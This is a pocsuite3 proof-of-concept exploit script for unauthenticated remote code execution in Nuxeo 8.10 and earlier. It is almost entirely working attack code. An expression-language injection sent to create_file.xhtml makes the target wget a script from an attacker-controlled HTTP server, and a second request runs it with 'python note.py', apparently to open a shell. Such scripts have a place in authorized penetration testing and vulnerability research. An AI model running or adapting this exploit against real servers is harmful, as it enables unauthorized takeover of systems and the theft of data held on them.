#!/usr/bin/env python3

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import POC_CATEGORY, OptDict, OptString, OptIP, OptPort, VUL_TYPE
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from collections import OrderedDict

from pocsuite3.lib.core.common import get_host_ip, get_host_ipv6
from pocsuite3.lib.core.data import logger
from pocsuite3.modules.httpserver import PHTTPServer, BaseRequestHandler

class DemoPOC(POCBase):
    vulID = ''
    version = ''
    author = 'm01e'  # PoC作者的大名
    vulDate = '2018-08-08'  # 漏洞公开的时间,不知道就写今天
    createDate = '20200731'  # 编写 PoC 的日期
    updateDate = ''  # PoC 更新的时间,默认和编写时间一样
    references = [
        'https://medium.com/@m01e/nuxeo-unauthenticated-rce-analysis-2f88d412e176',
        'http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html',
        'http://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf']  # 漏洞地址来源,0day不用写
    name = 'Nuxeo Unauthenticated RCE'  # PoC 名称
    appPowerLink = 'https://www.nuxeo.com/'  # 漏洞厂商主页地址
    appName = 'Nuxeo'  # 漏洞应用名称
    appVersion = '<= 8.10'  # 漏洞影响版本
    vulType = 'Remote Code Execution'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
    Nuxeo unauthenticated remote code execution vulnerability. 
        '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' 
    1. before use <check>/<attack>
    step1: set target <http://<YOUR-HOST:PORT>/>
    step2: set http_server_ip <YOUR-HTTP-SERVER-IP>
    step3: set http_server_port <YOUR-HTTP-SERVER-PORT>
    step4: start your http server 
    step5: check
    
    2. before use <shell>
    step1-4: the same as <check>/<attack>
    step5: set lhost <YOUR-HOST>
    step6: set lport <YOUR-PORT>
    step7: exploit
    '''

    # def start_ipv4_httpserver(self, ip, port):
    #     try:
    #         PHTTPServer._instance = None
    #         self.httpd = PHTTPServer(bind_ip=ip, bind_port=port, requestHandler=MyRequestHandler)
    #         self.httpd.start()
    #     except Exception as e:
    #         logger.info('start http server failed!', e)
    #
    # def stop_ipv4_httpserver(self):
    #     self.httpd.stop()

    def _options(self):
        o = OrderedDict()
        o["http_server_ip"] = OptIP('192.168.3.1', description='HTTP服务IP', require=True)
        o["http_server_port"] = OptPort(8384, description='HTTP服务端口', require=True)
        return o

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _verify(self):
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        result = {}
        httpServerIp = self.get_option('http_server_ip')
        httpServerPort = self.get_option('http_server_port')
        # 因为使用了format对字符串格式化, 故需要在原来的payload里多加一层{},否则会报错
        payload_part1 = "/?key=#{{request.setAttribute('methods',''['class'].forName('java.lang.Runtime').getDeclaredMethods())" \
                        "---request.getAttribute('methods')[15].invoke(request.getAttribute('methods')[7].invoke(null), " \
                        "'wget {0}:{1}/note.py')}}".format(httpServerIp, httpServerPort)
        url = urljoin(self.url, "/nuxeo/create_file.xhtml")
        params = {
            'actionMethod': "widgets/suggest_add_new_directory_entry_iframe.xhtml:request.getParameter('directoryNameForPopup')",
            'directoryNameForPopup': payload_part1
        }
        try:
            rr = requests.get(url, params=params, verify=False)
            if rr.status_code == 302 or rr.status_code == 200:
                result['status'] = 'success'
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        self._verify()

        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }

        payload_part2 = "/?key=#{request.setAttribute('methods',''['class'].forName('java.lang.Runtime').getDeclaredMethods())" \
                        "---request.getAttribute('methods')[15].invoke(request.getAttribute('methods')[7].invoke(null), " \
                        "'python note.py')}"

        url = urljoin(self.url, "/nuxeo/create_file.xhtml")
        params = {
            'actionMethod': "widgets/suggest_add_new_directory_entry_iframe.xhtml:request.getParameter('directoryNameForPopup')",
            'directoryNameForPopup': payload_part2
        }
        try:
            rr = requests.get(url, params=params, verify=False)
            if rr.status_code == 302 or rr.status_code == 200:
                pass
        except ReadTimeout:
            pass
        except Exception as e:
            pass

register_poc(DemoPOC)
